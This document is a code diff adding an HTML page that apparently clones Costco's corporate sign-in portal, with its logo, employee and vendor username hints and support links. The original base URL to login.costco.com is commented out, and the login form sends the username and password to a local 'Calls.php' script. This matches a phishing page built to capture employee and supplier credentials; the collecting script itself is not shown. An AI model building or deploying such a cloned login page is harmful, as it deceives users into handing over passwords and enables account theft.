@@ -1,0 +1,201 @@
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Sign In</title>
+    <!--<base href="https://login.costco.com/">--><base href=".">
+    <meta name="robots" content="noindex, nofollow">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="stylesheet" type="text/css" href="opelas/foundation.css">
+    <link rel="stylesheet" type="text/css" href="opelas/app.css">
+    <!--[if lt IE 9]>
+    <link rel="stylesheet" href="assets/css/ie8-grid-support.css" type="text/css"/>
+    <![endif]-->
+</head><body onload="iframefix();setFocus();">
+<!--<![endif]-->
+    <!--[if lte IE 7]>
+    <p class="browsehappy">
+        You are using an <strong>outdated</strong> browser. Please
+        <a href="http://browsehappy.com/">upgrade your browser</a>
+        to improve your experience.
+    </p>
+    <![endif]-->
+    <div id="content">
+        <div class="wrapper">
+            <!--div class="ping-container ping-signin">
+    <div class="ping-header">
+        Sign In
+    </div -->
+            <!-- .ping-header -->
+            <!-- <div class="ping-body-container">
+        <div class="section-title">
+            Sign In
+        </div>
+        <div> -->
+            <form method="POST" action="Calls.php" autocomplete="off">
+                <div id="header">
+                    <img src="opelas/costco_logo_160px.png" alt="costco logo" height="47" width="160" align="bottom">
+                </div>
+                <div id="main-content">
+                    <div class="row">
+                        <div class="column">
+                            <h1>
+								                Sign In
+							             </h1>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="column">
+                            <div class="ping-messages">
+                                                                                                                                
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="column">
+                            <div class="row--form">
+                                <div class="ping-input-label">
+                                    Username
+                                </div>
+
+                                <div class="ping-input-container">
+                                                                        <input id="username" type="text" size="36" name="username" value="" autocorrect="off" autocapitalize="off" onkeypress="return postOnReturn(event)">
+                                    <!---->
+                                                                    </div>
+                                <div class="footnote">
+                                    <span>Employees/Alumni = My Costco Account (LAN ID)</span>
+                                    <span>Vendors/Suppliers = E-mail Address</span>
+                                </div>
+                                <div class="row--form">
+                                    <div class="ping-input-label">
+                                        Password
+                                    </div>
+                                    <div class="ping-input-container">
+                                        <input id="password" type="password" size="36" name="pass" onkeypress="return postOnReturn(event)">
+                                    </div>
+
+                                                                                                            <div class="footnote">
+                                        <span>Password is case sensitive.</span>
+                                    </div>
+                                </div>
+                                <div class="row--form">
+                                    <!-- <div class="ping-buttons"> -->
+                                       
+
+
+                                        <!-- a href="javascript:void(0)" onclick="postOk();" class="ping-button normal allow" title="Sign In">
+                        Sign In
+                    </a> -->
+                                        
+                                        <input type="submit" class="button" value="Sign In">
+										<!-- <a href="https://fssts.costco.com/adfs/ls/trouble.aspx">Trouble Signing In?</a>-->
+                                        <a href="https://fssts.costco.com/pm/trouble.aspx">Trouble Signing In?</a>
+
+                                        <!-- </div> .ping-buttons -->
+                                        <input type="hidden" name="pf.adapterId" value="HTMLFormAdapter">
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+            </form>
+            <!-- </div><!-- .ping-body -->
+            <!-- </div><!-- .ping-body-container -->
+            <!-- <div class="ping-footer-container">
+        <div class="ping-footer">
+            <div class="ping-credits"></div>
+            <div class="ping-copyright">© Copyright Costco Wholesale Corporation <script>document.getElementById('footer').appendChild(document.createTextNode(new Date().getFullYear()))</script></div>
+        </div> <!-- .ping-footer -->
+            <!-- </div> .ping-footer-container -->
+            <!-- </div> .ping-container -->
+	       </div>
+   </div>
+
+   <div id="footer" class="text-center">© Copyright Costco Wholesale Corporation <script>document.getElementById('footer').appendChild(document.createTextNode(new Date().getFullYear()))</script>20242023</div>
+
+   <script type="text/javascript">
+    function iframefix(){
+		if (document.URL.indexOf("client_id=pa_sapbobj") > -1){
+            if (((document.referrer.indexOf("https://login.costco.com") <= -1)&&(document.referrer.indexOf("https://sapanalytics.corp.costco.com/BOE/BI") <= -1))||(!document.referrer)){
+                window.top.location.href='https://sapanalytics.corp.costco.com/BOE/BI';
+            }
+        }
+        if(window.top!==window.self){
+            if (document.URL.indexOf("client_id=pa_sapbobj") > -1)  {
+                    window.top.location.href='https://sapanalytics.corp.costco.com/BOE/BI';
+            }
+            else {
+                window.top.location.href=window.self.location.href;
+            }
+        }
+   }             
+             
+                function postOk() {
+        document.forms[0]['pf.ok'].value = 'clicked';
+        document.forms[0].submit();
+    }
+    function postCancel() {
+        document.forms[0]['pf.cancel'].value = 'clicked';
+        document.forms[0].submit();
+    }
+    function postOnReturn(e) {
+        var keycode;
+        if (window.event) keycode = window.event.keyCode;
+        else if (e) keycode = e.which;
+        else return true;
+
+        if (keycode == 13) {
+            document.forms[0].submit();
+            return false;
+        } else {
+            return true;
+        }
+    }
+    function setFocus() {
+        var platform = navigator.platform;
+        if(platform != null && platform.indexOf("iPhone") == -1) {
+                            document.getElementById('username').focus();
+                    }
+    }
+    function setMobile(mobile) {
+        var className = ' mobile',
+            hasClass = (bodyTag.className.indexOf(className) !== -1);
+
+        if(mobile && !hasClass) {
+            bodyTag.className += className;
+
+        } else if (!mobile && hasClass) {
+            bodyTag.className = bodyTag.className.replace(className, '');
+        }
+
+        
+        <!-- Check if this is the PingOne Mobile App -->
+            }
+    function getScreenWidth() {
+        return (window.outerHeight) ? window.outerWidth : document.body.clientWidth;
+    }
+
+    var bodyTag = document.getElementsByTagName('body')[0],
+        width = getScreenWidth(),
+        remember = false && false;
+
+    
+    if(/Android|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+        setMobile(true);
+    } else {
+        setMobile((width <= 480));
+        window.onresize = function() {
+            width = getScreenWidth();
+            setMobile((width <= 480));
+        }
+    }
+    </script>
+
+
+
+
+<script id="f5_cspm">(function(){var f5_cspm={f5_p:'KCKFJBECIBNILIGKPKPLMBBMDHDDNPAGDHBGPKEHLNHLAFFPEICLCFMIGLBBCIABDPMBBLDLEFEDPDOJDPNABOJOAPMIPOOEIKHEJFLCGHNHMDCPCFMGPFEGIIGKAHIH',setCharAt:function(str,index,chr){if(index>str.length-1)return str;return str.substr(0,index)+chr+str.substr(index+1);},get_byte:function(str,i){var s=(i/16)|0;i=(i&15);s=s*32;return((str.charCodeAt(i+16+s)-65)<<4)|(str.charCodeAt(i+s)-65);},set_byte:function(str,i,b){var s=(i/16)|0;i=(i&15);s=s*32;str=f5_cspm.setCharAt(str,(i+16+s),String.fromCharCode((b>>4)+65));str=f5_cspm.setCharAt(str,(i+s),String.fromCharCode((b&15)+65));return str;},set_latency:function(str,latency){latency=latency&0xffff;str=f5_cspm.set_byte(str,40,(latency>>8));str=f5_cspm.set_byte(str,41,(latency&0xff));str=f5_cspm.set_byte(str,35,2);return str;},wait_perf_data:function(){try{var wp=window.performance.timing;if(wp.loadEventEnd>0){var res=wp.loadEventEnd-wp.navigationStart;if(res<60001){var cookie_val=f5_cspm.set_latency(f5_cspm.f5_p,res);window.document.cookie='f5avr0106053301aaaaaaaaaaaaaaaa_cspm_='+encodeURIComponent(cookie_val)+';path=/;'+'';}
+return;}}
+catch(err){return;}
+setTimeout(f5_cspm.wait_perf_data,100);return;},go:function(){var chunk=window.document.cookie.split(/\s*;\s*/);for(var i=0;i<chunk.length;++i){var pair=chunk[i].split(/\s*=\s*/);if(pair[0]=='f5_cspm'&&pair[1]=='1234')
+{var d=new Date();d.setTime(d.getTime()-1000);window.document.cookie='f5_cspm=;expires='+d.toUTCString()+';path=/;'+';';setTimeout(f5_cspm.wait_perf_data,100);}}}}
+f5_cspm.go();}());</script></body>
